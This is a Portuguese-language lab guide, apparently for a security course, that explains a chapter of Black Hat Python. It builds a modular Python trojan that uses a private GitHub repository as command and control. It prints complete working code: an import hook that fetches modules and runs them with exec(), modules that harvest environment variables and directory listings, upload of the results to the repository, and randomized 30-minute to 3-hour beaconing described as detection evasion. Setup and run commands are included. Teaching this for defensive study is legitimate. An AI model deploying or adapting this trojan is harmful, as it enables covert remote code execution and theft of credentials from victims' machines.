# Guia Prático Completo: GitHub Command and Control (Cap. 7)

**Laboratório Prático:** BHT Lab — Repositório privado `bhtprojan`
**Ambiente de Testes:** Python 3.6–3.11 + `github3.py` (para 3.12+ veja `git_trojan_moderno.py` no módulo 03)
**Código de Apoio:** `git_trojan.py`, `modules/dirlister.py`, `modules/environment.py`, `config/abc.json`
**Fonte fiel:** `black-hat-python-cap7-github-c2.md`

---

> ⚠️ **Aviso de Responsabilidade e Ética Profissional**
> As técnicas demonstradas neste material têm como finalidade exclusiva o aprendizado de segurança defensiva e testes autorizados em ambiente de laboratório.
> Execute apenas contra repositório **privado** e máquina virtual de laboratório, com autorização do professor.
> Qualquer execução contra sistemas de terceiros sem autorização prévia por escrito é ilegal, nos termos do **Marco Civil da Internet (Lei nº 12.965/2014)** e do **Artigo 154-A do Código Penal Brasileiro**.

---

## 1. O Cenário: Trojan Modular com GitHub como C2

O objetivo é criar um **trojan modular** que usa o GitHub como canal de comando e controle. O trojan:

```text
+-----------------------+                    +-----------------------+
|   GITHUB (bhtprojan)  |                    |   VÍTIMA (git_trojan) |
|                       |  1. CONFIG         |                       |
|  config/abc.json      | -----------------> |  Baixa JSON + base64  |
|  lista módulos        |  baixa + decodifica|  importa dinamicamente|
|                       |  2. MÓDULOS        |                       |
|  modules/*.py         | -----------------> |  Executa run() em     |
|  código-fonte         |  GitImporter baixa |  thread separada      |
|                       |  3. RESULTADOS     |                       |
|  data/abc/*.data      | <----------------- |  Envia base64 + sleep |
|  logs codificados     |  create_file       |  30min–3h e repete    |
+-----------------------+                    +-----------------------+
```

1. Autentica no GitHub via token pessoal (`mytoken.txt`, nunca commitado).
2. Baixa `config/<id>.json` que lista quais módulos executar.
3. Baixa dinamicamente o código dos módulos (`modules/<nome>.py`).
4. Executa cada módulo em uma thread separada.
5. Envia os resultados para `data/<id>/<timestamp>.data`.
6. Dorme tempo aleatório (30 min a 3 h) e repete.

> 💡 **A grande sacada:** hack no sistema de importação do Python. Quando o trojan tenta `import keylogger`, o Python não encontra localmente e chama nosso `GitImporter`, que baixa o `.py` do GitHub e carrega em memória via `exec()`.

---

## 2. Conceitos Técnicos Específicos Deste Trojan

### A. Transporte em Base64
O GitHub devolve `content` em base64. Todo download precisa de `base64.b64decode()` e todo upload de `base64.b64encode()`.

### B. Threads para Módulos Paralelos
Cada tarefa roda em `threading.Thread(target=module_runner)`. Um módulo lento (ex.: keylogger de 10 min) não bloqueia os outros. Há `sleep(randint(1,10))` entre disparos para não gerar rajada detectável.

### C. Sleep Aleatório Longo (Evasão)
`time.sleep(random.randint(30*60, 3*60*60))` faz o beacon variar de 30 min a 3 h, quebrando detecção por padrão fixo de rede.

### D. Import Hook (PEP 302)
`sys.meta_path.append(GitImporter())` registra um importador customizado. `find_module()` baixa o código; `load_module()` cria o módulo com `importlib.util.spec_from_module` + `exec()` + registro em `sys.modules`.

---

## 3. Análise Linha a Linha do Código

### 3.1 Módulo `dirlister.py` — Lista arquivos do diretório atual

```python
 1 | import os
 2 |
 3 |
 4 | def run(**args):
 5 |     print("[*] In dirlister module.")
 6 |     files = os.listdir(".")
 7 |     return str(files)
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `1` | `import os` | Necessário para `os.listdir()`. |
| `4` | `def run(**args):` | Assinatura padrão de todo módulo. `**args` aceita argumentos via JSON. |
| `5` | `print(...)` | Log de debug. |
| `6` | `files = os.listdir(".")` | Lista arquivos do diretório atual. |
| `7` | `return str(files)` | Converte para string serializável. |

### 3.2 Módulo `environment.py` — Coleta variáveis de ambiente

```python
 1 | import os
 2 |
 3 |
 4 | def run(**args):
 5 |     print("[*] In environment module.")
 6 |     return os.environ
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `1` | `import os` | Para `os.environ`. |
| `4` | `def run(**args):` | Assinatura padrão. |
| `6` | `return os.environ` | Retorna dict com variáveis (pode conter credenciais e paths). |

### 3.3 Configuração `config/abc.json`

```json
[
  { "module": "dirlister" },
  { "module": "environment" }
]
```

| Elemento | Finalidade Técnica |
| :--- | :--- |
| Lista `[...]` | Permite N módulos por ciclo. |
| `"module": "dirlister"` | Nome importado dinamicamente via `exec("import ...")`, acionando o `GitImporter` para buscar `modules/dirlister.py`. |

### 3.4 Trojan principal `git_trojan.py` — Imports e conexão

```python
 1 | import base64
 2 | import github3
 3 | import importlib
 4 | import json
 5 | import random
 6 | import sys
 7 | import threading
 8 | import time
 9 |
10 | from datetime import datetime
11 |
12 | def github_connect():
13 |     with open('mytoken.txt') as f:
14 |         token = f.read()
15 |     user = 'tianro'
16 |     sess = github3.login(token=token)
17 |     return sess.repository(user, 'bhtprojan')
18 |
19 | def get_file_contents(dirname, module_name, repo):
20 |     return repo.file_contents(f'{dirname}/{module_name}').content
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `1` | `import base64` | Codifica/decodifica (GitHub usa base64). |
| `2` | `import github3` | API do GitHub. |
| `3` | `import importlib` | Cria módulos dinamicamente. |
| `4–8` | `json, random, sys, threading, time` | Config, evasão, import hook, paralelismo, sleeps. |
| `10` | `from datetime import datetime` | Timestamp dos `.data`. |
| `13–14` | `open('mytoken.txt')` | Lê token (deve estar no `.gitignore`). |
| `16–17` | `github3.login().repository()` | Autentica e retorna objeto do repo. |
| `20` | `repo.file_contents(...).content` | Baixa conteúdo em base64. |

### 3.5 Classe `Trojan`

```python
21 | class Trojan:
22 |     def __init__(self, id):
23 |         self.id = id
24 |         self.config_file = f'{id}.json'
25 |         self.data_path = f'data/{id}/'
26 |         self.repo = github_connect()
27 |
28 |     def get_config(self):
29 |         config_json = get_file_contents('config', self.config_file, self.repo)
30 |         config = json.loads(base64.b64decode(config_json))
31 |         for task in config:
32 |             if task['module'] not in sys.modules:
33 |                 exec("import %s" % task['module'])
34 |         return config
35 |
36 |     def module_runner(self, module):
37 |         result = sys.modules[module].run()
38 |         self.store_module_result(result)
39 |
40 |     def store_module_result(self, data):
41 |         message = datetime.now().isoformat()
42 |         remote_path = f'data/{self.id}/{message}.data'
43 |         bindata = bytes('%r' % data, 'utf-8')
44 |         self.repo.create_file(remote_path, message, base64.b64encode(bindata))
45 |
46 |     def run(self):
47 |         while True:
48 |             config = self.get_config()
49 |             for task in config:
50 |                 thread = threading.Thread(target=self.module_runner, args=(task['module'],))
51 |                 thread.start()
52 |                 time.sleep(random.randint(1, 10))
53 |             time.sleep(random.randint(30 * 60, 3 * 60 * 60))
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `23–26` | `__init__` | Guarda ID, nome do JSON, pasta remota e conexão. |
| `29–30` | `get_file_contents + b64decode + json.loads` | Baixa e decodifica a lista de tarefas. |
| `31–33` | `exec("import ...")` | Força importação, acionando o `GitImporter`. |
| `37` | `sys.modules[module].run()` | Chama entry-point do módulo. |
| `41–44` | `store_module_result` | Cria `data/<id>/<timestamp>.data` com resultado em base64. |
| `47–53` | `run()` | Loop infinito: recarrega config, dispara threads, dorme 30min–3h. |

### 3.6 Classe `GitImporter` + `__main__`

```python
54 | class GitImporter:
55 |     def __init__(self):
56 |         self.current_module_code = ""
57 |
58 |     def find_module(self, name, path=None):
59 |         print("[*] Attempting to retrieve %s" % name)
60 |         self.repo = github_connect()
61 |         new_library = get_file_contents('modules', f'{name}.py', self.repo)
62 |         if new_library is not None:
63 |             self.current_module_code = base64.b64decode(new_library)
64 |             return self
65 |
66 |     def load_module(self, name):
67 |         spec = importlib.util.spec_from_module(name, loader=None, origin=self.repo.git_url)
68 |         new_module = importlib.util.module_from_spec(spec)
69 |         exec(self.current_module_code, new_module.__dict__)
70 |         sys.modules[spec.name] = new_module
71 |         return new_module
72 |
73 | if __name__ == '__main__':
74 |     sys.meta_path.append(GitImporter())
75 |     trojan = Trojan('abc')
76 |     trojan.run()
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `58` | `find_module(name, path)` | Chamado quando import local falha (API antiga, pré-3.12). |
| `61–64` | Baixa `modules/<nome>.py` e decodifica | Guarda código em `current_module_code` e retorna `self`. |
| `67–71` | `spec_from_module + module_from_spec + exec + sys.modules` | Cria módulo vazio, executa código remoto no namespace dele e registra. |
| `74` | `sys.meta_path.append(...)` | Registra o importador no protocolo PEP 302. |
| `75–76` | `Trojan('abc').run()` | Inicia o beacon com ID `abc`. |

---

## 4. Código Completo: `git_trojan.py`

```python
import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime


def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'tianro'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhtprojan')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents(
            'config', self.config_file, self.repo
        )
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(
            remote_path, message, base64.b64encode(bindata)
        )

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_module(
            name, loader=None, origin=self.repo.git_url
        )
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
```

---

## 5. Procedimento de Execução e Estrutura do Repositório

1. Crie a estrutura no GitHub (repositório **privado**):
   ```text
   bhtprojan/
   ├── .gitignore          # ignora mytoken.txt
   ├── config/
   │   └── abc.json        # lista de módulos
   ├── modules/
   │   ├── dirlister.py
   │   └── environment.py
   └── data/
       └── abc/            # resultados enviados pelo trojan
   ```
2. Comandos para criar o repo local e subir:
   ```bash
   mkdir bhtprojan && cd bhtprojan
   git init
   mkdir modules config data
   touch .gitignore
   echo "mytoken.txt" >> .gitignore
   git add .
   git commit -m "Adds repo structure for trojan."
   git remote add origin https://github.com/<seu-usuario>/bhtprojan.git
   git push origin master
   ```
3. Na máquina de laboratório, crie `mytoken.txt` com token clássico de escopo `repo` e rode:
   ```bash
   pip install github3.py
   python git_trojan.py
   ```
4. **Saída esperada (primeiro ciclo):**
   ```text
   [*] Attempting to retrieve dirlister
   [*] In dirlister module.
   [*] Attempting to retrieve environment
   [*] In environment module.
   ```

> 📌 **Observações importantes:**
> * `mytoken.txt` deve estar no `.gitignore` para não vazar o token.
> * O token precisa de permissão de leitura e escrita.
> * Em Python **3.12+**, `find_module`/`load_module` foram removidos — use o `git_trojan_moderno.py` do módulo 03 (`find_spec`/`exec_module`).
> * Em versões recentes do `github3.py`, `create_file` pode esperar conteúdo **sem** base64. Ajuste conforme a doc da versão instalada.
